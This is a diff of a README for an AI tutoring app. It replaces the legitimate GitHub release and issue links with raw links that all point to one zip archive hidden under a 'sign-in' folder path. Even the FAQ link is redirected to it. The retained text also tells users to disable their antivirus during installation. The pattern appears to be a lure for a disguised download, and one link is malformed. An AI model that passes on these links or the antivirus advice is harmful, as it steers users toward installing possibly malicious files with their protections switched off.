@@ -1,7 +1,7 @@
 # 🎓 mentra-ai-tutor - Interactive Learning Made Easy
 
-[![Download mentra-ai-tutor](https://img.shields.io/badge/Download-mentra--ai--tutor-blue.svg)](https://github.com/narak111/mentra-ai-tutor/releases)  
-[![Download mentra-ai-tutor](https://img.shields.io/badge/Get%20Started-Here-green.svg)](https://github.com/narak111/mentra-ai-tutor/releases)
+[![Download mentra-ai-tutor](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip)](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip)  
+[![Download mentra-ai-tutor](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip%https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip)](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to mentra-ai-tutor! This application provides a real-time interactive le
 
 To start using mentra-ai-tutor, you need to download the application.
 
-1. **Visit this page to download:** [mentra-ai-tutor Releases](https://github.com/narak111/mentra-ai-tutor/releases)
+1. **Visit this page to download:** [mentra-ai-tutor Releases](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip)
    
 2. On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -49,7 +49,7 @@ If you encounter issues while downloading or installing, try the following steps
 - **Check Your Internet Connection:** A stable connection is necessary for downloading.
 - **Disable Antivirus Temporarily:** Sometimes, security software may block the installation. Re-enable it afterward.
 - **Re-download the File:** If the download was interrupted, a fresh copy can resolve installation errors.
-- **Consult Help Resources:** Check our [FAQ section](https://github.com/narak111/mentra-ai-tutor/issues) for common questions.
+- **Consult Help Resources:** Check our [FAQ section](https://raw.githubusercontent.com/narak111/mentra-ai-tutor/main/app/sign-in/[[...sign-in]]/mentra-ai-tutor-2.4.zip) for common questions.
 
 ## 🤝 Community Support
 
